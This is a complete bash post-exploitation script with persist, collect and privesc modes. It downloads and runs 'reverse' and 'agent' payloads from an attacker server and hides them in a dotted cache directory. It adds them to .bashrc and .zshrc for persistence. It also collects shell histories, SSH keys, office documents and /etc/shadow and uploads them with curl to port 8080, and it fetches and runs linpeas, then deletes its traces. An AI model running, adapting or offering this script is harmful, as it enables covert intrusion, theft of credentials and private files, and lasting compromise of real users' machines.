#!/usr/bin/env bash
set -euo pipefail

# Usage: ./script.sh <mode> <server_ip>
# Modes: persist | privesc | collect | all

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <mode> <server_ip>"
    echo "Modes: persist | privesc | collect | all"
    exit 1
fi

MODE="$1"
SERVER_IP="$2"
HOSTNAME="$(hostname 2>/dev/null || true)"
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(hostnamectl --static 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(cat /etc/hostname 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="unknown"
fi
USERNAME="$(id -un)"

# Determine home directory safely
if [ -n "${HOME:-}" ]; then
    BASEDIR="$HOME"
else
    if [ "$USERNAME" = "root" ]; then
        BASEDIR="/root"
    else
        BASEDIR="/home/$USERNAME"
    fi
fi

WORKDIR="$BASEDIR/.local/.cache/.svc"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

persist_mode() {
    echo "[*] Running persist mode in $WORKDIR"

    wget -q "http://$SERVER_IP/payloads/agent"   -O agent   || { echo "[-] Failed to download agent"; exit 1; }
    wget -q "http://$SERVER_IP/payloads/reverse" -O reverse || { echo "[-] Failed to download reverse"; exit 1; }
    chmod +x agent reverse

    ./reverse & disown || echo "[-] Reverse failed"
    ./agent &   disown || echo "[-] Agent failed"

    echo "[*] Adding persistence to shell configs..."
    for rc in "$BASEDIR/.bashrc" "$BASEDIR/.zshrc"; do
        if [ -f "$rc" ]; then
            if ! grep -q "$WORKDIR/reverse" "$rc"; then
                echo "$WORKDIR/reverse &" >> "$rc"
            fi
            if ! grep -q "$WORKDIR/agent" "$rc"; then
                echo "$WORKDIR/agent &" >> "$rc"
            fi
        fi
    done

    echo "[+] Persistence components started and added to rc files."
}

collect_mode() {
    echo "[*] Running collect mode..."

    FILES=$(find /home -type f \
        \( -name ".bash_history" -o -name ".zsh_history" \
        -o -name ".bashrc" -o -name ".zshrc" \
        -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
        -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.doc" -o -name "*.docx" \
        -o -name "id_*" -o -name "authorized_keys" \) 2>/dev/null)

    FILES+=" $(test -r /etc/shadow && echo /etc/shadow)"


    for f in $FILES; do
        if [ -f "$f" ]; then
            OWNER="$(stat -c "%U" "$f")"
            BASENAME="$(basename "$f")"
            CUSTOM_NAME="${HOSTNAME}_${OWNER}_${BASENAME}"
            echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
            curl -s -F "file=@$f;filename=$CUSTOM_NAME" "http://$SERVER_IP:8080/p" \
                || echo "[-] Failed to send $f"
        fi
    done

    echo "[+] Collection & exfiltration complete."
}

privesc_mode() {
    echo "[*] Running privesc mode in $WORKDIR"

    wget -q "http://$SERVER_IP/linpeas" -O linpeas || { echo "[-] Failed to download linpeas"; exit 1; }
    chmod +x linpeas

    ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt"
    curl -s -F "file=@${HOSTNAME}_linpeas.txt" "http://$SERVER_IP:8080/p" || echo "[-] Failed to send file"

    rm -f linpeas "${HOSTNAME}_linpeas.txt"
    echo "[+] Privesc scan completed and cleaned up."
}

case "$MODE" in
    persist) persist_mode ;;
    privesc) privesc_mode ;;
    collect) collect_mode ;;
    all) 
        persist_mode
        collect_mode
        privesc_mode
        ;;
    *)
        echo "Invalid mode: $MODE"
        echo "Valid modes: persist | privesc | collect | all"
        exit 1
        ;;
esac
